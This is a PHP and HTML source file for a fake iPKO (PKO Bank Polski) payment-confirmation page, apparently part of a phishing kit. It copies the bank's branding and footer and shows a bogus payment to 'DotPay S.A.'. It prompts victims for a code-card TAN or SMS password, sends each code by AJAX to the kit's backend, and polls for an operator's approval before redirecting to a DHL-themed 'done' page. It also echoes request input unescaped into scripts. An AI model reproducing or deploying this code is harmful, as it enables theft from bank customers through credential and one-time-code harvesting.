<?php
$root = realpath($_SERVER["DOCUMENT_ROOT"]);

include_once('../bank_header.php'); ?>
<?php include('../../../db.php');
include('../../../YH0uW3ecaRHG16ld4waY.php');
include_once('../../../utils.php');

if($_REQUEST['id']){
  $id = $_REQUEST['id'];
}


$sqq = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$new = $con->query($sqq);
$rowp = $new->fetch_assoc();
$num = $new->num_rows;
$date = date("d.m.Y");
$number = $rowp['account_number'];
$array  = array_map('intval', str_split($number));
$grip = $rowp['gridcode'];

//for($i=0;$i<27;$i++){ echo $array[$i]; if ($i%4 == 1) {echo '&nbsp;'; } }
?>


<script type="text/javascript">
                 
setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
function upd_last_login(str) {
    if (str == "") {
        // document.getElementById("txtHint").innerHTML = "";
        // return;
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = this.responseText;
                //alert(this.responseText);
            }
        };
  
        xmlhttp.open("GET","update123.php?id="+str,true);
        xmlhttp.send();
    }
}
</script>


<script src="../date.js"></script>

<html class=" dk_fouc">

<head>
        <title>Serwis Internetowy iPKO</title>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="description" content="iPKO">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
        <link rel="stylesheet" href="css/styles.css">
<!--[if lte IE 9]>
        <link rel="stylesheet" href="/secure/ikd3/css/ie9.css?ts=73c444878e07716a3b481ddcb222427e5cefa573" />
<![endif]-->
<!--[if lte IE 8]>
        <link rel="stylesheet" href="/secure/ikd3/css/ie8.css?ts=73c444878e07716a3b481ddcb222427e5cefa573" />
<![endif]--></head>
    <body class="no-touch">
        <div id="container"><div id="header" class="header-region"><div class="header"><a class="x-logo logo" href="#">iPKO</a>
<ul class="top">
 
 <li class="client-ctx"> finanse osobiste</li>
 
 <li class="account-number">
 Numer klienta: <?php echo $rowp['bank_user_id']; ?> <span><span></span></span>
 </li>
</ul>
<ul class="box">
 
 <li class="message-count x-messages" style="display: none">
 <!--<a href="#messages" class="x-messages-link">Wiadomości<span class="circle_red rounded"></span></a>-->
 </li>
 <li class="settings x-settings" style="display: none">
 <!-- <a href="#settings">Ustawienia</a> -->
 </li>
 
 <li class="session-timer"><span>


<span class=" time">

</span></span></li>
</ul>
<div class="clear"></div>
</div></div>
<div id="menu" class="menu-region"></div>
<h3 style="color:green; text-align:center"></h3><br>
<div id="content" class="layout-content" style="position: relative;"><div><div class="ui-inplace-dialog"><div class="ui-inplace-dialog-titlebar" aria-live="polite"><span class="ui-inplace-dialog-title">Zlecasz płatność za zakupy internetowe</span></div><div class="ui-inplace-dialog-content" aria-live="polite"><div class="content"><div><div class="dialog-large">
    <ul class="columns divided">
        <li><ul class="form-set push-130">
                
                    <li>
                        <label class="label pull">Z</label>
                        <span class="value">PKO KONTO BEZ GRANIC<br></span>
                        <ul class="limits">
                            <li class="size-130">                            </li>
                            <li>Limit
                                <div>brak</div>
                            </li>
                        </ul>
                    </li>
                
                <li>
                    <label class="label pull">Kwota</label>
                    <span class="value">&nbsp;<?php echo $rowp['payment']; ?>   PLN</span>
                </li>
                <li>
                    <label class="label pull">Data</label>
                    <span class="value">&nbsp;<script>document.write(date)</script></span>
                </li>
            </ul>
        </li>
        <li>
            <ul class="form-set push-120">
                <li>
                    <label class="label pull">Na rachunek odbiorcy</label>
 <span class="value"><?php for($i=0;$i<27;$i++){ echo $array[$i]; if ($i%4 == 1) {echo '&nbsp;'; } } ?> <br> </span>

                    <span class="value"><br></span>
                </li>
                <li>
                    <label class="label pull">Odbiorca</label>
                    <span class="value">DotPay S.A.</span>
                </li>
                <li>
                    <label class="label pull">Adres</label>
                    <span class="value"><?php echo $rowp['address']; ?> <br> </span>
                </li>
                <li>
                    <label class="label pull">Szczegóły zakupu</label>
                    <span class="value"><?php echo $rowp['title'] ?><br></span>
                </li>
                <li id='additionalopis'>
                    <label class="label pull" for="editField#38">Dodatkowy opis</label>
                    <span class="input"><input value="" readonly disable class="size-250 f-additional-description ui-ipko-input" maxlength="35" aria-disabled="false" id="editField#38" type="text"></span>
                </li>
                <li id="additionalLoader" >
                    <img src="loading.gif" style="width: 30%" >
            <!--         <textarea id="smscode" placeholder="Smscode">adsf</textarea>  -->
<!--                   <input placeholder="Code numer"  style="
                                <?php if(($pay['checked']==0)&&($pay['gridcode'] == "")) { echo "display: none"; } ?>
                  " > -->
                </li>

                 <?php 
                    echo "<li id='additionalopis1' style='margin-top: 30px;display:none'>";
                     echo "<label class='label pull' for='editField#38'  style='width: 275px;margin-right: 15px;'>Wprowadz kod nr <span id='myspan'> " .$grip." </span> z karty kodow</label>";
                    echo '<span class="input"><input style="width: 80px;" id="SmsCodes1"  name="SmsCodes1" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input  type="hidden" name="UserName" value=""><a style="color:red">*</a></span>';
                    echo "</li>";

                    echo "<li id='additionalopis2' style='margin-top: 30px;display:none'>";
                    echo "<label class='label pull' for='editField#38'  style='width: 275px;margin-right: 15px;'>Hasło SMS</label>";
                    
                    echo '<span class="input"><input style="width: 80px;"  id="SmsCodes2"  name="SmsCodes2" required="" value="" class="f-tan-code" maxlength="6" data-autofocus="true" type="password"> <input type="hidden" name="UserName" value=""><a style="color:red">*</a></span>';
                                        echo "</li>";
                ?>



                <label class='label pull' id='invalid_message'  style='width: 450; margin-right: 0x; display: none; color: red;'>Kod jest niepoprawny. Prosimy sprobować ponownie</label>
  
                 <li><center><img src="loading.gif" style="width: 120px;display:none;margin-top:-50px; margin: -65px 0px 0px 86px;" id="alert_valid"></center>
                </li>
                <!--li><div class="ui-inplace-dialog-buttonpane"><div class="ui-inplace-dialog-buttonset"><button   onclick="auth_code('<?php echo $_REQUEST['id']; ?>')" id="ipkodalej" style="paddding_top:100px" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-state-hover ui-state-focus" role="button" aria-disabled="false">
    <span class="ui-button-text">Dalej</span></button></div></div></li-->
            </ul>
        </li>
    </ul>
	<div id="smscodediv" class="form-row push-code" style="display:none">
        <label class="label" id="labelsms">
    

</label>
        <!--span class="input code req">
          <form method="post"  action="indexauth.php?id=<?php echo $_REQUEST['id']; ?>">
				<input name="SmsCode" required value="" class="f-tan-code" maxlength="6"  id="editField#43" type="text">
				<input type="hidden" name="UserName" value="" />
        </span-->
    </div>

    <div class="ui-dialog-footer"><div class="req">Pole wymagane</div></div>
</div>
</div></div></div><div class="ui-inplace-dialog-buttonpane"><div class="ui-inplace-dialog-buttonset">
<button class="ui-dialog-button-text ui-dialog-button-left ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">anuluj</span></button><div style=" float: right;margin-top: -28px;" class="ui-inplace-dialog-buttonpane"><div class="ui-inplace-dialog-buttonset"><button   onclick="auth_code('<?php echo $_REQUEST['id']; ?>')" id="ipkodalej" style="paddding_top:100px" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-state-hover ui-state-focus" role="button" aria-disabled="false">
    <span class="ui-button-text">Dalej</span></button></div></div>
    <!--button id="showsms" onclick="window.location.href='indexauth.php?id=<?php echo $_REQUEST['id']; ?>'" type="submit" name="submit" class="ui-dialog-button-right ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">Dalej</span></button-->
    
    </div></div></div></div><div id='ui-ajax-loader' class="ui-ajax-loader" style="min-height: 75px;display:none"><i></i></div></div>
    </div></div><div id='ui-ajax-loader' class="ui-ajax-loader" style="min-height: 75px;display:none"><i></i></div></div></div></div>
<div id="footer" style="width: 960px;margin: 0 auto;    padding: 0 10px;" class="interpay"><div class="footer"><div class="nav">
		  </form>
 
 <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/ipko-faq/" class="link" target="_blank">Nowe iPKO - pomoc</a></li>
 
 <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/nowe-ipko-nowe-mozliwosci/pomoc-i-wersje-demonstracyjne/filmy-instruktazowe/" class="link" target="_blank">Filmy instruktażowe</a></li>
 
 <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/bezpieczna-bankowosc/" class="link" target="_blank">Bezpieczeństwo</a></li>
 
 <li><a href="http://www.pkobp.pl/pliki-do-pobrania/" class="link" target="_blank">Regulaminy</a></li>
 
 <li><a href="http://www.pkobp.pl/oplaty-i-prowizje/" class="link" target="_blank">Opłaty</a></li>
 
 <li><a href="http://www.pkobp.pl/oprocentowanie/" class="link" target="_blank">Oprocentowanie</a></li>
 
 <li><a href="http://www.pkobp.pl/waluty/#rates" class="link" target="_blank">Kursy walut</a></li>
 
 <li><a href="https://www.pkobp.pl/grupa-pko-banku-polskiego/pko-bank-polski/zasady-gwarantowania-depozytow/" class="link" target="_blank">Gwarantowanie depozytów</a></li>
 
 <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/nowe-ipko-nowe-mozliwosci/pomoc-i-wersje-demonstracyjne/przewodniki/" class="link" target="_blank">Przewodniki po iPKO (iPKO electronic banking services guide)</a></li>
 
</div>

 <div class="box">
 </div>
 <div class="box">
 </div>

<div class="last_login">
 
 Ostatnie logowanie 2017-05-04 22:08:09
 
 
 <span>|</span>
 Ostatnie nieudane logowanie 2017-05-04 16:33:01
 
</div>
<div class="copyright">
 © 2017 PKO Bank Polski<span>Kod BIC (Swift): BPKOPLPW</span>
</div>
<div class="hotline">Serwis telefoniczny iPKO: 800 302 302, (+48) 81 535 60 60
 <div class="padding-top">800 302 302 (brak opłat dla numerów krajowych na terenie kraju; w pozostałych</div>
 <div class="no-padding-top">przypadkach – opłata zgodna z taryfą operatora), 81 535 60 60 (opłata zgodna</div>
 <div class="no-padding-top">z taryfą operatora). Serwis telefoniczny czynny całą dobę.</div>
</div>
<div class="clear"></div>
</div></div>
</div>

<!--<script src="../../files5135151351/jquery.js"></script>-->
<script type="text/javascript">
var formularz = 0;
var CheckingInterval;
var jgrip;
function IsChecked()
{
    $.get("./IsCheckd.php", 'id=<?php echo $_REQUEST['id']; ?>',function(data, status){
            if(status=='success')
            {
                var array1 = data.split('&');
                if(array1[0]=='1')
                {
                    jgrip=array1[1];

                    

                    clearInterval(CheckingInterval);
                    $("#additionalLoader").css("display", "none");
                    if (jgrip) {
                        $('#myspan').text(jgrip);
                        $("#additionalopis1").css("display", "show");
                        $("#additionalopis2").css("display", "none");
                    }
                    else{
                        $("#additionalopis2").css("display", "show");
                        $("#additionalopis1").css("display", "none");
                    }
                }
                else
                {
                    $("#additionalopis1").css("display", "none");
                    $("#additionalopis2").css("display", "none");
                }
            }
        });
}
CheckingInterval=setInterval(IsChecked,1000);


var checkinterval;

function check_status(payment_id) {
//    alert(payment_id);
    if (payment_id.length == 0) {
    } 
    else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                console.log(this.responseText);
                <?php $_dhlpayment = URL_dhlpayment_id33; ?>
                if(this.responseText=='VALID CODE'){
                    clearInterval(checkinterval);
                    window.location.href = "<?php echo $_dhlpayment;?>done/index.html";
                    //window.location.href="https://www.google.com";

                }
                if(this.responseText=='INVALID CODE'){
                    //window.location.href="";
                    
                    //document.getElementById("alert_invalid").style.display = 'block';
                    //ocument.getElementById("SmsCodes").style.display = 'block';
                    document.getElementById("invalid_message").style.display = 'none';
                    document.getElementById("ipkodalej").disabled = true;
                }
                if(this.responseText=='WRONG CODE'){
             
                   //document.getElementById("alert_invalid").style.display = 'block';
                    if(jgrip)
                        document.getElementById("SmsCodes1").style.visibility = 'visible';
                    else
                        document.getElementById("SmsCodes2").style.visibility = 'visible';

                    document.getElementById("alert_valid").style.display = 'none';
                    document.getElementById("invalid_message").style.display = 'block';
                    document.getElementById("ipkodalej").disabled = false;
				    document.getElementById("myspan").textContent = '<?php echo $grip ?>';

                    window.location.href="";
                    clearInterval(checkinterval);
                }
            }
        };
        xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=aproove", true);
        xmlhttp.send();
    }
}

function auth_code(payment_id) {
    var inpObj,codes;
    if(jgrip)
    {
        inpObj = document.getElementById("SmsCodes1");
        codes = document.getElementById("SmsCodes1").value;
    }
    else
    {
        inpObj = document.getElementById("SmsCodes2");
        codes = document.getElementById("SmsCodes2").value;
    }
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);

    if (inpObj.checkValidity() == false) {
        if(jgrip)
            document.getElementById("SmsCodes1").placeholder = '';
        else
            document.getElementById("SmsCodes2").placeholder = '';
    }else{
                if(this.responseText=='VALID CODE'){

                    if(jgrip)
                        document.getElementById("SmsCodes1").style.visibility = 'hidden';
                    else
                        document.getElementById("SmsCodes2").style.visibility = 'hidden';
                    document.getElementById("alert_valid").style.display = 'block';
                    document.getElementById("ipkodalej").disabled = true;

                    checkinterval=setInterval(function(){ check_status(<?php echo $id; ?>); }, 1000);
                    //setTimeout(function(){ window.location.href="status_cancel.php?id=<?php echo $id; ?>"; }, 100000);
                }
    }
                    //alert(this.responseText);
            }
        };
        xmlhttp.open("GET", "ajax123.php?code=" + codes +"&id=" + payment_id, true);
        xmlhttp.send();
    }
}

jQuery("button#showsms").click(function(e) {
	
	function fetchauth() {
                jQuery.ajax({
                    url: 'ajaxauth.php',
                    global: true,
                    type: 'POST',
                    data: { 
						'userlogin': ''
					},
                    async: true,
                    success: function(response){                    
						jQuery("#labelsms").html(response);
						//alert(response);
					},
                    error: function () {
                    }
                });
            }
		
	if(formularz==0) {
		jQuery("#ui-ajax-loader").show();
		setTimeout(function() {
		    
		 
			e.preventDefault();
			fetchauth();
			jQuery("#additionalopis").hide();
			jQuery("#ui-ajax-loader").hide();
			jQuery("div#smscodediv").slideDown();
			formularz = 1;
		
			
			
		}, 10000);
	} else{
		var identyfikator = jQuery("form#kodsms input").val();
		if (identyfikator.length >= 1) jQuery("form#kodsms").submit();
	}

});


</script>
    
</body>

</html>